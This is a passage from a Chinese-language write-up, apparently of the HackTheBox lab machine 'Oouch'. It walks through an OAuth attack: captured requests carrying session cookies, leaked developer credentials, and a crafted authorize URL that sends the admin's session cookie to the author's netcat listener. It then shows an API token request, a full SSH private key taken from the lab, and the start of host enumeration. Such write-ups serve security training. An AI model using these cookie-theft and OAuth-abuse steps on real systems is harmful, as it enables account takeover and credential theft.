<li>访问<a href="http://consumer.oouch.htb:5000/oauth/connect" target="_blank" rel="noopener">http://consumer.oouch.htb:5000/oauth/login</a>，看到一个新的确认界面,  这里有个坑，不要直接点页面的链接，显示是login实际是connect，自己复制login浏览器访问：</li>
</ol>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071613.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071611.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<ol start="7">
<li>然后查看profile，发现我们的账号和qtc账号connect，qtc账号是管理员，可以查看documents：</li>
</ol>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071612.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071614.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<table>
<thead>
<tr>
<th>dev_access.txt</th>
<th><strong>develop:supermegasecureklarabubu123! -&gt; Allows application registration.</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>o_auth_notes.txt</strong></td>
<td><strong>/api/get_user -&gt; user data. oauth/authorize -&gt; Now also supports GET method.</strong></td>
</tr>
<tr>
<td><strong>todo.txt</strong></td>
<td><strong>Chris mentioned all users could obtain my ssh key. Must be a joke…</strong></td>
</tr>
</tbody></table>
<p>注意todo.txt内容，提示信息，下一步就是想办法获取ssh key</p>
<h2 id="connect"><a href="#connect" class="headerlink" title="connect"></a>connect</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/oauth/connect</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: consumer.oouch.htb:5000</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: session=.eJwlj81qAzEMhF_F-ByKLf8qT9F7CUG2pezSNFvWm1PIu1fQkxCj-Wb0sle501x42vPXy5pDh_3hOenG9mQ_70yTzX27mfVhjs1Q7yqaY1mn-dWbD3t5X04K2Xku9nzsT9ZtHfZsa-sx9IA5Z4oDiKH6mjxEkJF7dIOHQx8kIYKT1DCgy76nWHzmXDjFVBFLHMjdI4hIKzFCSi0Au1gxSA4SQAHEJdMo1Lp0RVIqXYLW73OX67F980P7uNI4KdrlRugHxwqFfa6aRNycWgUAo1ffc_L-_wTY9x86CVVn.Xw_qeQ.OhEurQbmZ8KQ1QpEkIULM48hEQI</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br></pre></td></tr></table></figure>

<h2 id="authorize"><a href="#authorize" class="headerlink" title="authorize"></a>authorize</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&amp;scope=read</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: authorization.oouch.htb:8000</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: csrftoken=HmhQQiCSvm9A3pArOk2xBIg0E6UwSjMthmB6ezKXklnfOrKaxqYx00Ca6uhiSeQF; sessionid=s7blde1d26stukpb5uobfu211fi186rk</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br></pre></td></tr></table></figure>

<h2 id="confirm-authorize"><a href="#confirm-authorize" class="headerlink" title="confirm authorize"></a>confirm authorize</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&amp;scope=read</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: authorization.oouch.htb:8000</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 266</span><br><span class="line"><span class="attribute">Origin</span>: http://authorization.oouch.htb:8000</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&amp;scope=read</span><br><span class="line"><span class="attribute">Cookie</span>: csrftoken=HmhQQiCSvm9A3pArOk2xBIg0E6UwSjMthmB6ezKXklnfOrKaxqYx00Ca6uhiSeQF; sessionid=s7blde1d26stukpb5uobfu211fi186rk</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"></span><br><span class="line">csrfmiddlewaretoken=Soc7lOdGu6tzSqeevTL2ZljQztn8Bma1U3PXUCZ1UrkjIRUMcOC0ZkZeIQrkyA4o&amp;redirect_uri=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Fconnect%2Ftoken&amp;scope=read&amp;client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;state=&amp;response_type=code&amp;allow=Authorize</span><br></pre></td></tr></table></figure>

<h2 id="token"><a href="#token" class="headerlink" title="token"></a>token</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/oauth/connect/token?code=JWPBsJgZk9GsyqvzANgTg02qrdvXhz</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: consumer.oouch.htb:5000</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&amp;scope=read</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: session=.eJwlj81qAzEMhF_F-ByKLf8qT9F7CUG2pezSNFvWm1PIu1fQkxCj-Wb0sle501x42vPXy5pDh_3hOenG9mQ_70yTzX27mfVhjs1Q7yqaY1mn-dWbD3t5X04K2Xku9nzsT9ZtHfZsa-sx9IA5Z4oDiKH6mjxEkJF7dIOHQx8kIYKT1DCgy76nWHzmXDjFVBFLHMjdI4hIKzFCSi0Au1gxSA4SQAHEJdMo1Lp0RVIqXYLW73OX67F980P7uNI4KdrlRugHxwqFfa6aRNycWgUAo1ffc_L-_wTY9x86CVVn.Xw_qeQ.OhEurQbmZ8KQ1QpEkIULM48hEQI</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br></pre></td></tr></table></figure>

<h1 id="目录扫描-1"><a href="#目录扫描-1" class="headerlink" title="目录扫描"></a>目录扫描</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;authorization.oouch.htb:8000&#x2F;oauth&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;common.txt</span><br><span class="line">&#x2F;applications (Status: 301)</span><br><span class="line"></span><br><span class="line">gobuster dir -u http:&#x2F;&#x2F;authorization.oouch.htb:8000&#x2F;oauth&#x2F;applications -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;common.txt</span><br><span class="line">&#x2F;register (Status: 301)</span><br><span class="line"></span><br><span class="line">develop:supermegasecureklarabubu123!</span><br></pre></td></tr></table></figure>

<h2 id="register"><a href="#register" class="headerlink" title="register"></a>register</h2><p>需要认证，可以使用前面document中得到的账号密码：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071615.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071616.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>



<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="new-application"><a href="#new-application" class="headerlink" title="new application"></a>new application</h2><p>新建一个application，重定向URL设置为我们自己的监听server：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071617.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071618.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="构造URL"><a href="#构造URL" class="headerlink" title="构造URL"></a>构造URL</h2><p>根据oauth2协议规范构造url：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;authorization.oouch.htb:8000&#x2F;oauth&#x2F;authorize&#x2F;?client_id&#x3D;ue1FGRi1HRlRUmikHZy3oAxeeAowHQGB2KFH8LgA&amp;redirect_uri&#x3D;http:&#x2F;&#x2F;10.10.14.32:7777&amp;grant_type&#x3D;authorization_code&amp;client_secret&#x3D;VgiDaPFrnhFB9BZDKhujIsHHLhX4KReSKGdBrRQkLVx3RZwKxux1Ej2w6giDHmNkqeSFyPtvJdkcom6NfBfr9WFavBYGoMPj5wB58g14iSdB5EKQU2psXRQsreLOh8Aa</span><br></pre></td></tr></table></figure>

<h2 id="SSRF-1"><a href="#SSRF-1" class="headerlink" title="SSRF"></a>SSRF</h2><p>将构造的URL发给管理员，监听接收到管理员cookie：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071619.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 7777</span><br><span class="line">Listening on any address 7777 (cbt)</span><br><span class="line">Connection from 10.10.10.177:48784</span><br><span class="line">GET /?error=invalid_request&amp;error_description=Missing+response_type+parameter. HTTP/1.1</span><br><span class="line">Host: 10.10.14.32:7777</span><br><span class="line">User-Agent: python-requests/2.21.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cookie: sessionid=zn0t5p80u92kej7o7mmenhwygrntein6;</span><br><span class="line"></span><br><span class="line">Total received bytes: 273</span><br><span class="line">Total sent bytes: 0</span><br></pre></td></tr></table></figure>

<h2 id="qtc-cookie"><a href="#qtc-cookie" class="headerlink" title="qtc cookie"></a>qtc cookie</h2><p>修改cookie，刷新，现在我们是qtc用户身份：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071620.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="API"><a href="#API" class="headerlink" title="API"></a>API</h1><p>现在我们可以尝试以qtc用户身份通过API获取信息，首先需要获得access token：</p>
<p>这里需要用client_credentials的application,用自己的账号修改类型后再切到qtc账号：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071621.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST &#39;http:&#x2F;&#x2F;authorization.oouch.htb:8000&#x2F;oauth&#x2F;token&#x2F;&#39; -H &quot;Content-Type: application&#x2F;x-www-form-urlencoded&quot; --data &quot;grant_type&#x3D;client_credentials&amp;client_id&#x3D;ue1FGRi1HRlRUmikHZy3oAxeeAowHQGB2KFH8LgA&amp;client_secret&#x3D;VgiDaPFrnhFB9BZDKhujIsHHLhX4KReSKGdBrRQkLVx3RZwKxux1Ej2w6giDHmNkqeSFyPtvJdkcom6NfBfr9WFavBYGoMPj5wB58g14iSdB5EKQU2psXRQsreLOh8Aa&quot; -L -s</span><br><span class="line">&#123;&quot;access_token&quot;: &quot;DZMcOVlYaBFgJ0j6AApUgzSb79PArE&quot;, &quot;expires_in&quot;: 600, &quot;token_type&quot;: &quot;Bearer&quot;, &quot;scope&quot;: &quot;read write&quot;&#125;%</span><br></pre></td></tr></table></figure>

<h2 id="get-ssh-key"><a href="#get-ssh-key" class="headerlink" title="get ssh key"></a>get ssh key</h2><p>使用这个token通过API获取ssh key：</p>
<p><a href="http://authorization.oouch.htb:8000/api/get_ssh/?access_token=DZMcOVlYaBFgJ0j6AApUgzSb79PArE" target="_blank" rel="noopener">http://authorization.oouch.htb:8000/api/get_ssh/?access_token=DZMcOVlYaBFgJ0j6AApUgzSb79PArE</a></p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071622.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="ssh-key"><a href="#ssh-key" class="headerlink" title="ssh key"></a>ssh key</h2><p>格式比较坑，修复后：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAqQvHuKA1i28D1ldvVbFB8PL7ARxBNy8Ve&#x2F;hfW&#x2F;V7cmEHTDTJtmk7</span><br><span class="line">LJZzc1djIKKqYL8eB0ZbVpSmINLfJ2xnCbgRLyo5aEbj1Xw+fdr9&#x2F;yK1Ie55KQjgnghNdg</span><br><span class="line">reZeDWnTfBrY8sd18rwBQpxLphpCR367M9Muw6K31tJhNlIwKtOWy5oDo&#x2F;O88UnqIqaiJV</span><br><span class="line">ZFDpHJ&#x2F;u0uQc8zqqdHR1HtVVbXiM3u5M&#x2F;6tb3j98Rx7swrNECt2WyrmYorYLoTvGK4frIv</span><br><span class="line">bv8lvztG48WrsIEyvSEKNqNUfnRGFYUJZUMridN5iOyavU7iY0loMrn2xikuVrIeUcXRbl</span><br><span class="line">zeFwTaxkkChXKgYdnWHs+15qrDmZTzQYgamx7+vD13cTuZqKmHkRFEPDfa&#x2F;PXloKIqi2jA</span><br><span class="line">tZVbgiVqnS0F+4BxE2T38q&#x2F;&#x2F;G513iR1EXuPzh4jQIBGDCciq5VNs3t0un+gd5Ae40esJKe</span><br><span class="line">VcpPi1sKFO7cFyhQ8EME2DbgMxcAZCj0vypbOeWlAAAFiA7BX3cOwV93AAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAKkLx7igNYtvA9ZXb1WxQfDy+wEcQTcvFXv4X1v1e3JhB0w0ybZpOyyWc3NXYyCi</span><br><span class="line">qmC&#x2F;HgdGW1aUpiDS3ydsZwm4ES8qOWhG49V8Pn3a&#x2F;f8itSHueSkI4J4ITXYK3mXg1p03wa</span><br><span class="line">2PLHdfK8AUKcS6YaQkd+uzPTLsOit9bSYTZSMCrTlsuaA6PzvPFJ6iKmoiVWRQ6Ryf7tLk</span><br><span class="line">HPM6qnR0dR7VVW14jN7uTP+rW94&#x2F;fEce7MKzRArdlsq5mKK2C6E7xiuH6yL27&#x2F;Jb87RuPF</span><br><span class="line">q7CBMr0hCjajVH50RhWFCWVDK4nTeYjsmr1O4mNJaDK59sYpLlayHlHF0W5c3hcE2sZJAo</span><br><span class="line">VyoGHZ1h7Pteaqw5mU80GIGpse&#x2F;rw9d3E7maiph5ERRDw32vz15aCiKotowLWVW4Ilap0t</span><br><span class="line">BfuAcRNk9&#x2F;Kv&#x2F;xudd4kdRF7j84eI0CARgwnIquVTbN7dLp&#x2F;oHeQHuNHrCSnlXKT4tbChTu</span><br><span class="line">3BcoUPBDBNg24DMXAGQo9L8qWznlpQAAAAMBAAEAAAGBAJ5OLtmiBqKt8tz+AoAwQD1hfl</span><br><span class="line">fa2uPPzwHKZZrbd6B0Zv4hjSiqwUSPHEzOcEE2s&#x2F;Fn6LoNVCnviOfCMkJcDN4YJteRZjNV</span><br><span class="line">97SL5oW72BLesNu21HXuH1M&#x2F;GTNLGFw1wyV1+oULSCv9zx3QhBD8LcYmdLsgnlYazJq&#x2F;mc</span><br><span class="line">CHdzXjIs9dFzSKd38N&#x2F;RRVbvz3bBpGfxdUWrXZ85Z&#x2F;wPLPwIKAa8DZnKqEZU0kbyLhNwPv</span><br><span class="line">XO80K6s1OipcxijR7HAwZW3haZ6k2NiXVIZC&#x2F;m&#x2F;WxSVO6x8zli7mUqpik1VZ3X9HWH9ltz</span><br><span class="line">tESlvBYHGgukRO&#x2F;OFr7VOd&#x2F;EpqAPrdH4xtm0wM02k+qVMlKId9uv0KtbUQHV2kvYIiCIYp</span><br><span class="line">&#x2F;Mga78V3INxpZJvdCdaazU5sujV7FEAksUYxbkYGaXeexhrF6SfyMpOc2cB&#x2F;rDms7KYYFL</span><br><span class="line">&#x2F;4Rau4TzmN5ey1qfApzYC981Yy4tfFUz8aUfKERomy9aYdcGurLJjvi0r84nK3ZpqiHQAA</span><br><span class="line">AMBS+Fx1SFnQvV&#x2F;c5dvvx4zk1Yi3k3HCEvfWq5NG5eMsj+WRrPcCyc7oAvb&#x2F;TzVn&#x2F;Eityt</span><br><span class="line">cEfjDKSNmvr2SzUa76Uvpr12MDMcepZ5xKblUkwTzAAannbbaxbSkyeRFh3k7w5y3N3M5j</span><br><span class="line">sz47&#x2F;4WTxuEwK0xoabNKbSk+plBU4y2b2moUQTXTHJcjrlwTMXTV2k5Qr6uCyvQENZGDRt</span><br><span class="line">XkgLd4XMed+UCmjpC92&#x2F;Ubjc+g&#x2F;qVhuFcHEs9LDTG9tAZtgAEAAADBANMRIDSfMKdc38il</span><br><span class="line">jKbnPU6MxqGII7gKKTrC3MmheAr7DG7FPaceGPHw3n8KEl0iP1wnyDjFnlrs7JR2OgUzs9</span><br><span class="line">dPU3FW6pLMOceN1tkWj+&#x2F;8W15XW5J31AvD8dnb950rdt5lsyWse8+APAmBhpMzRftWh86w</span><br><span class="line">EQL28qajGxNQ12KeqYG7CRpTDkgscTEEbAJEXAy1zhp+h0q51RbFLVkkl4mmjHzz0&#x2F;6Qxl</span><br><span class="line">tV7VTC+G7uEeFT24oYr4swNZ+xahTGvwAAAMEAzQiSBu4dA6BMieRFl3MdqYuvK58lj0NM</span><br><span class="line">2lVKmE7TTJTRYYhjA0vrE&#x2F;kNlVwPIY6YQaUnAsD7MGrWpT14AbKiQfnU7JyNOl5B8E10Co</span><br><span class="line">G&#x2F;0EInDfKoStwI9KV7&#x2F;RG6U7mYAosyyeN+MHdObc23YrENAwpZMZdKFRnro5xWTSdQqoVN</span><br><span class="line">zYClNLoH22l81l3minmQ2+Gy7gWMEgTx&#x2F;wKkse36MHo7n4hwaTlUz5ujuTVzS+57Hupbwk</span><br><span class="line">IEkgsoEGTkznCbAAAADnBlbnRlc3RlckBrYWxpAQIDBA&#x3D;&#x3D;</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>使用这个ssh key，以qtc用户连接，得到user.txt:</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071623.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="搜集信息"><a href="#搜集信息" class="headerlink" title="搜集信息"></a>搜集信息</h1><p>查看ip发现docker，172.17.0.1/16和172.18.0.1/16两个网段：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">qtc@oouch:~$ ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens34: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    link/ether 00:50:56:b9:ad:af brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.10.10.177/24 brd 10.10.10.255 scope global ens34</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 dead:beef::250:56ff:feb9:adaf/64 scope global dynamic mngtmpaddr</span><br><span class="line">       valid_lft 86195sec preferred_lft 14195sec</span><br><span class="line">    inet6 fe80::250:56ff:feb9:adaf/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default</span><br><span class="line">    link/ether 02:42:57:4d:fe:8d brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">4: br-cc6c78e0c7d0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default</span><br><span class="line">    link/ether 02:42:a5:93:e9:a4 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-cc6c78e0c7d0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::42:a5ff:fe93:e9a4/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">6: vethceecf07@if5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-cc6c78e0c7d0 state UP group default</span><br><span class="line">    link/ether 1a:6d:1b:fe:5e:6f brd ff:ff:ff:ff:ff:ff link-netnsid 1</span><br><span class="line">    inet6 fe80::186d:1bff:fefe:5e6f/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">8: veth91c935d@if7: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-cc6c78e0c7d0 state UP group default</span><br><span class="line">    link/ether aa:21:f6:24:9c:54 brd ff:ff:ff:ff:ff:ff link-netnsid 3</span><br><span class="line">    inet6 fe80::a821:f6ff:fe24:9c54/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">10: vethb848da6@if9: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-cc6c78e0c7d0 state UP group default</span><br><span class="line">    link/ether 22:d2:ed:91:5d:e3 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet6 fe80::20d2:edff:fe91:5de3/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">12: veth039163f@if11: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-cc6c78e0c7d0 state UP group default</span><br><span class="line">    link/ether 